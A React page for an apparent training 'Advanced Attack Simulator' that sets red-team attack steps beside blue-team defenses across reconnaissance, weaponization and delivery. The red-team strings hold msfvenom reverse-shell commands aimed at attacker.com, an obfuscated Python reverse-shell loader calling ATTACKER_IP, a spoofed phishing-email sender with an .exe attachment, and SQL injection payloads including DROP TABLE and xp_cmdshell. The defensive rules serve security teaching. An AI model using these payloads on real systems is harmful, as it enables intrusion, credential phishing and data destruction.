'use client';

import { useState } from 'react';
import {
  Target,
  Shield,
  Code,
  Terminal,
  Play,
  Pause,
  CheckCircle,
  Eye,
  Lock,
  Crosshair
} from 'lucide-react';
import { cn } from '@/lib/utils';

interface AttackPhase {
  id: string;
  name: string;
  mitre: string;
  redTeam: {
    objective: string;
    tools: string[];
    commands: string[];
    code: string;
    techniques: string[];
  };
  blueTeam: {
    detection: string[];
    prevention: string[];
    code: string;
    tools: string[];
  };
}

const ATTACK_SCENARIOS: AttackPhase[] = [
  {
    id: 'recon',
    name: '1. Reconnaissance',
    mitre: 'TA0043',
    redTeam: {
      objective: 'Discover target systems, identify open ports, enumerate services',
      tools: ['Nmap', 'Shodan', 'theHarvester', 'Recon-ng'],
      techniques: [
        'Network Scanning',
        'OSINT Gathering',
        'DNS Enumeration',
        'Service Discovery'
      ],
      commands: [
        'nmap -sS -p- -T4 target.com',
        'nmap -sV -sC -O target.com',
        'theHarvester -d target.com -b all',
        'dig target.com ANY',
        'whois target.com'
      ],
      code: `# Automated Reconnaissance Script
import nmap
import socket

def scan_target(target):
    nm = nmap.PortScanner()

    # SYN Stealth Scan
    nm.scan(target, '1-65535', '-sS -T4')

    open_ports = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in ports:
                if nm[host][proto][port]['state'] == 'open':
                    service = nm[host][proto][port]['name']
                    version = nm[host][proto][port].get('version', 'unknown')
                    open_ports.append({
                        'port': port,
                        'service': service,
                        'version': version
                    })

    return open_ports

# Execute reconnaissance
targets = ['target.com']
for target in targets:
    results = scan_target(target)
    print(f"Found {len(results)} open ports on {target}")
    for port_info in results:
        print(f"  {port_info['port']}/tcp - {port_info['service']} {port_info['version']}")`
    },
    blueTeam: {
      detection: [
        'Monitor for rapid connection attempts (IDS signature)',
        'Analyze firewall logs for port scans',
        'Detect ICMP sweeps and SYN floods',
        'Track unusual DNS queries'
      ],
      prevention: [
        'Implement rate limiting on firewall',
        'Use fail2ban to block scanning IPs',
        'Disable unnecessary services',
        'Configure firewall to drop, not reject packets'
      ],
      tools: ['Snort', 'Suricata', 'OSSEC', 'Fail2ban'],
      code: `# Snort Rule for Port Scan Detection
alert tcp any any -> $HOME_NET any (
    msg:"SCAN Potential TCP Port Scan";
    flow:stateless;
    flags:S;
    detection_filter:track by_src, count 15, seconds 60;
    classtype:attempted-recon;
    sid:1000001;
    rev:1;
)

# SIEM Correlation Rule (Splunk)
index=firewall sourcetype=iptables
| stats count by src_ip dest_port
| where count > 20
| eval severity="HIGH"
| table src_ip, dest_port, count, severity

# Automated Response Script
#!/bin/bash
# Auto-block scanning IPs
tail -f /var/log/snort/alert | while read line; do
    if echo "$line" | grep -q "Port Scan"; then
        ATTACKER_IP=$(echo "$line" | awk '{print $4}')
        iptables -A INPUT -s $ATTACKER_IP -j DROP
        echo "[BLOCKED] $ATTACKER_IP at $(date)" >> /var/log/auto-block.log
    fi
done`
    }
  },
  {
    id: 'weaponization',
    name: '2. Weaponization',
    mitre: 'T1587',
    redTeam: {
      objective: 'Create malicious payload, craft exploit, prepare delivery mechanism',
      tools: ['Metasploit', 'msfvenom', 'Cobalt Strike', 'Empire'],
      techniques: [
        'Payload Generation',
        'Obfuscation',
        'Encoding',
        'Exploit Development'
      ],
      commands: [
        'msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe > payload.exe',
        'msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 > encoded.exe',
        'msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_https; exploit"'
      ],
      code: `# Advanced Payload Generator with Obfuscation
import base64
import random
import string

def generate_obfuscated_payload():
    # Reverse shell payload (Python)
    payload = """
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
"""

    # Obfuscate with Base64 + XOR
    key = ''.join(random.choices(string.ascii_letters, k=16))
    encoded = base64.b64encode(payload.encode()).decode()

    # XOR encoding
    xor_encoded = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(encoded))
    final = base64.b64encode(xor_encoded.encode()).decode()

    # Generate loader
    loader = f"""
import base64
key = '{key}'
payload = '{final}'
decoded = base64.b64decode(payload).decode()
xor_decoded = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded))
exec(base64.b64decode(xor_decoded).decode())
"""

    return loader

# MSFVenom equivalent automation
def create_windows_payload(lhost, lport):
    # Generate shellcode
    shellcode = generate_reverse_shell_shellcode(lhost, lport)

    # Encode to bypass AV
    encoded = encode_shikata_ga_nai(shellcode, iterations=10)

    # Inject into PE template
    payload_exe = inject_into_pe_template(encoded)

    return payload_exe`
    },
    blueTeam: {
      detection: [
        'Endpoint AV/EDR detection of known signatures',
        'Behavioral analysis for suspicious process creation',
        'Network monitoring for C2 beaconing',
        'Sandbox analysis of executables'
      ],
      prevention: [
        'Application whitelisting (AppLocker)',
        'Code signing enforcement',
        'Disable macros by default',
        'Network segmentation'
      ],
      tools: ['Windows Defender ATP', 'CrowdStrike', 'Carbon Black', 'Cuckoo Sandbox'],
      code: `# YARA Rule for Metasploit Payloads
rule Metasploit_Payload {
    meta:
        description = "Detects Metasploit generated payloads"
        author = "Blue Team"
    strings:
        $meterpreter1 = "metsrv.dll" ascii
        $meterpreter2 = "ReflectiveLoader" ascii
        $msf_pattern = { 90 90 90 90 [0-10] E8 }
        $shikata = { D9 74 24 F4 5? [0-50] B? }
    condition:
        any of them
}

# PowerShell Script for Behavioral Detection
$events = Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'
    ID=1  # Process creation
} -MaxEvents 1000

foreach ($event in $events) {
    $xml = [xml]$event.ToXml()
    $commandLine = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'CommandLine'} | Select -ExpandProperty '#text'

    # Detect suspicious patterns
    if ($commandLine -match 'msfvenom|meterpreter|shikata|empire|cobalt') {
        Write-Host "[ALERT] Potential attack tool detected: $commandLine"
        # Block and alert
        Stop-Process -Id $event.ProcessId -Force
        Send-AlertToSIEM -Event $event
    }
}

# Sysmon Configuration for Advanced Logging
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">msfvenom;metasploit;cobalt</CommandLine>
    </ProcessCreate>
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">4444</DestinationPort>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>`
    }
  },
  {
    id: 'delivery',
    name: '3. Delivery & Exploitation',
    mitre: 'TA0001 - Initial Access',
    redTeam: {
      objective: 'Deliver payload via phishing, drive-by download, or exploit public-facing app',
      tools: ['SET (Social Engineering Toolkit)', 'Beef', 'Metasploit', 'SQLMap'],
      techniques: [
        'Spear Phishing (T1566)',
        'Exploit Public-Facing Application (T1190)',
        'Drive-by Compromise (T1189)',
        'Supply Chain Compromise (T1195)'
      ],
      commands: [
        'setoolkit # Social Engineering Toolkit',
        'sqlmap -u "http://target.com/login" --dump',
        'use exploit/multi/handler',
        'searchsploit apache 2.4.49'
      ],
      code: `# Phishing Email Generator with Malicious Attachment
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_phishing_email(target_email, payload_path):
    msg = MIMEMultipart()
    msg['From'] = 'hr@company-internal.com'  # Spoofed sender
    msg['To'] = target_email
    msg['Subject'] = 'URGENT: Review Updated Company Policy - Action Required'

    body = """
Dear Employee,

Please review the attached updated company security policy.
This requires your immediate attention and acknowledgment.

Click here to confirm: http://attacker-site.com/confirm?id={}

Best regards,
Human Resources Department
""".format(generate_tracking_id())

    msg.attach(MIMEText(body, 'plain'))

    # Attach weaponized document
    with open(payload_path, 'rb') as f:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="Policy_Update.exe"')
        msg.attach(part)

    # Send via compromised SMTP
    server = smtplib.SMTP('smtp.target.com', 587)
    server.starttls()
    server.login('compromised_account', 'password')
    server.send_message(msg)
    server.quit()

# SQL Injection for Initial Access
def sql_injection_attack(target_url):
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL, @@version--",
        "'; DROP TABLE users--",
        "' OR 1=1; EXEC xp_cmdshell('powershell IEX...')--"
    ]

    for payload in payloads:
        response = requests.post(target_url, data={'username': payload, 'password': payload})
        if 'Welcome' in response.text or response.status_code == 200:
            print(f"[SUCCESS] SQL Injection successful with: {payload}")
            return True
    return False`
    },
    blueTeam: {
      detection: [
        'Email gateway scanning for malicious attachments',
        'Web Application Firewall (WAF) detecting SQLi',
        'Anomaly detection for unusual email patterns',
        'Sandbox detonation of attachments'
      ],
      prevention: [
        'SPF/DKIM/DMARC email authentication',
        'Parameterized queries (prevent SQL injection)',
        'Input validation and sanitization',
        'Principle of least privilege'
      ],
      tools: ['Proofpoint', 'Mimecast', 'ModSecurity WAF', 'OWASP ZAP'],
      code: `# ModSecurity WAF Rule for SQL Injection
SecRule ARGS "@detectSQLi" \\
    "id:1000002,\\
    phase:2,\\
    block,\\
    log,\\
    msg:'SQL Injection Attack Detected',\\
    severity:'CRITICAL',\\
    tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION'"

# Python Input Validation (Prevent SQLi)
import re
from typing import Optional

def sanitize_input(user_input: str) -> Optional[str]:
    # Whitelist approach
    if not re.match(r'^[a-zA-Z0-9_@.+-]+$', user_input):
        log_security_event('Malicious input detected', user_input)
        return None

    # Length check
    if len(user_input) > 100:
        return None

    return user_input

# Parameterized Query (Safe)
def safe_login(username, password):
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, hash_password(password)))
    return cursor.fetchone()

# Email Analysis Script
import email
import magic
import yara

def analyze_email_attachment(email_path):
    msg = email.message_from_file(open(email_path))

    for part in msg.walk():
        if part.get_content_maintype() == 'multipart':
            continue
        if part.get('Content-Disposition') is None:
            continue

        # Extract attachment
        filename = part.get_filename()
        payload = part.get_payload(decode=True)

        # YARA scan
        rules = yara.compile(filepath='/etc/yara/malware_rules.yar')
        matches = rules.match(data=payload)

        if matches:
            quarantine_email(email_path)
            alert_soc_team(f"Malicious attachment detected: {filename}")
            return True

    return False`
    }
  }
];

export default function AttackSimulatorPage() {
  const [currentPhase, setCurrentPhase] = useState(0);
  const [view, setView] = useState<'red' | 'blue' | 'both'>('both');
  const [isRunning, setIsRunning] = useState(false);

  const phase = ATTACK_SCENARIOS[currentPhase];

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-accent/5 p-6">
      {/* Header */}
      <div className="mb-8">
        <h1 className="text-4xl font-bold bg-gradient-to-r from-red-500 via-purple-500 to-blue-500 bg-clip-text text-transparent">
          Advanced Attack Simulator
        </h1>
        <p className="text-muted-foreground mt-2">
          Complete cyber kill chain with Red Team attacks and Blue Team defenses
        </p>
      </div>

      {/* Controls */}
      <div className="flex items-center justify-between mb-8 bg-card border rounded-xl p-4">
        <div className="flex items-center gap-4">
          <button
            onClick={() => setView('red')}
            className={cn(
              "px-4 py-2 rounded-lg font-semibold transition-all",
              view === 'red' ? "bg-red-500 text-white" : "bg-accent"
            )}
          >
            <Target className="inline h-5 w-5 mr-2" />
            Red Team
          </button>
          <button
            onClick={() => setView('blue')}
            className={cn(
              "px-4 py-2 rounded-lg font-semibold transition-all",
              view === 'blue' ? "bg-blue-500 text-white" : "bg-accent"
            )}
          >
            <Shield className="inline h-5 w-5 mr-2" />
            Blue Team
          </button>
          <button
            onClick={() => setView('both')}
            className={cn(
              "px-4 py-2 rounded-lg font-semibold transition-all",
              view === 'both' ? "bg-purple-500 text-white" : "bg-accent"
            )}
          >
            <Eye className="inline h-5 w-5 mr-2" />
            Both Teams
          </button>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => setCurrentPhase(Math.max(0, currentPhase - 1))}
            disabled={currentPhase === 0}
            className="p-2 bg-accent rounded-lg disabled:opacity-50"
          >
            ◀
          </button>
          <button
            onClick={() => setIsRunning(!isRunning)}
            className={cn(
              "px-6 py-2 rounded-lg font-bold",
              isRunning ? "bg-red-500 text-white" : "bg-green-500 text-white"
            )}
          >
            {isRunning ? <Pause className="inline h-5 w-5" /> : <Play className="inline h-5 w-5" />}
            {isRunning ? ' Stop' : ' Run Simulation'}
          </button>
          <button
            onClick={() => setCurrentPhase(Math.min(ATTACK_SCENARIOS.length - 1, currentPhase + 1))}
            disabled={currentPhase === ATTACK_SCENARIOS.length - 1}
            className="p-2 bg-accent rounded-lg disabled:opacity-50"
          >
            ▶
          </button>
        </div>
      </div>

      {/* Phase Progress */}
      <div className="mb-8">
        <div className="flex items-center justify-between mb-4">
          {ATTACK_SCENARIOS.map((p, i) => (
            <div
              key={p.id}
              onClick={() => setCurrentPhase(i)}
              className={cn(
                "flex-1 relative cursor-pointer",
                i < ATTACK_SCENARIOS.length - 1 && "after:absolute after:top-1/2 after:right-0 after:w-full after:h-0.5 after:bg-border"
              )}
            >
              <div className={cn(
                "relative z-10 mx-auto w-12 h-12 rounded-full flex items-center justify-center border-4 transition-all",
                i === currentPhase
                  ? "bg-primary border-primary scale-125"
                  : i < currentPhase
                  ? "bg-green-500 border-green-500"
                  : "bg-card border-border"
              )}>
                {i < currentPhase ? <CheckCircle className="h-6 w-6 text-white" /> : i + 1}
              </div>
              <p className="text-xs text-center mt-2">{p.name.split('.')[1]}</p>
            </div>
          ))}
        </div>
      </div>

      {/* Main Content */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Red Team */}
        {(view === 'red' || view === 'both') && (
          <div className="bg-gradient-to-br from-red-500/10 to-orange-500/10 border-2 border-red-500/50 rounded-xl p-6">
            <div className="flex items-center gap-3 mb-4">
              <div className="p-3 bg-red-500 rounded-lg">
                <Target className="h-6 w-6 text-white" />
              </div>
              <div>
                <h2 className="text-2xl font-bold text-red-500">{phase.name}</h2>
                <p className="text-sm text-muted-foreground">MITRE ATT&CK: {phase.mitre}</p>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <h3 className="font-bold mb-2 flex items-center gap-2">
                  <Crosshair className="h-5 w-5" />
                  Objective
                </h3>
                <p className="text-sm bg-card/50 p-3 rounded-lg">{phase.redTeam.objective}</p>
              </div>

              <div>
                <h3 className="font-bold mb-2">Techniques</h3>
                <div className="flex flex-wrap gap-2">
                  {phase.redTeam.techniques.map((tech, i) => (
                    <span key={i} className="px-3 py-1 bg-red-500/20 text-red-500 rounded-full text-xs font-semibold">
                      {tech}
                    </span>
                  ))}
                </div>
              </div>

              <div>
                <h3 className="font-bold mb-2 flex items-center gap-2">
                  <Terminal className="h-5 w-5" />
                  Commands
                </h3>
                <div className="bg-black/90 p-4 rounded-lg font-mono text-sm space-y-2">
                  {phase.redTeam.commands.map((cmd, i) => (
                    <div key={i} className="text-green-400">
                      <span className="text-yellow-400">$</span> {cmd}
                    </div>
                  ))}
                </div>
              </div>

              <div>
                <h3 className="font-bold mb-2 flex items-center gap-2">
                  <Code className="h-5 w-5" />
                  Implementation Code
                </h3>
                <pre className="bg-black/90 p-4 rounded-lg text-xs overflow-x-auto">
                  <code className="text-green-400">{phase.redTeam.code}</code>
                </pre>
              </div>
            </div>
          </div>
        )}

        {/* Blue Team */}
        {(view === 'blue' || view === 'both') && (
          <div className="bg-gradient-to-br from-blue-500/10 to-cyan-500/10 border-2 border-blue-500/50 rounded-xl p-6">
            <div className="flex items-center gap-3 mb-4">
              <div className="p-3 bg-blue-500 rounded-lg">
                <Shield className="h-6 w-6 text-white" />
              </div>
              <div>
                <h2 className="text-2xl font-bold text-blue-500">Defense Strategy</h2>
                <p className="text-sm text-muted-foreground">Counter-Measures</p>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <h3 className="font-bold mb-2 flex items-center gap-2">
                  <Eye className="h-5 w-5" />
                  Detection Methods
                </h3>
                <ul className="space-y-2">
                  {phase.blueTeam.detection.map((method, i) => (
                    <li key={i} className="flex items-start gap-2 text-sm bg-card/50 p-3 rounded-lg">
                      <CheckCircle className="h-5 w-5 text-green-500 flex-shrink-0 mt-0.5" />
                      {method}
                    </li>
                  ))}
                </ul>
              </div>

              <div>
                <h3 className="font-bold mb-2 flex items-center gap-2">
                  <Lock className="h-5 w-5" />
                  Prevention Controls
                </h3>
                <ul className="space-y-2">
                  {phase.blueTeam.prevention.map((control, i) => (
                    <li key={i} className="flex items-start gap-2 text-sm bg-card/50 p-3 rounded-lg">
                      <Shield className="h-5 w-5 text-blue-500 flex-shrink-0 mt-0.5" />
                      {control}
                    </li>
                  ))}
                </ul>
              </div>

              <div>
                <h3 className="font-bold mb-2">Defense Tools</h3>
                <div className="flex flex-wrap gap-2">
                  {phase.blueTeam.tools.map((tool, i) => (
                    <span key={i} className="px-3 py-1 bg-blue-500/20 text-blue-500 rounded-full text-xs font-semibold">
                      {tool}
                    </span>
                  ))}
                </div>
              </div>

              <div>
                <h3 className="font-bold mb-2 flex items-center gap-2">
                  <Code className="h-5 w-5" />
                  Defense Code & Rules
                </h3>
                <pre className="bg-black/90 p-4 rounded-lg text-xs overflow-x-auto">
                  <code className="text-cyan-400">{phase.blueTeam.code}</code>
                </pre>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
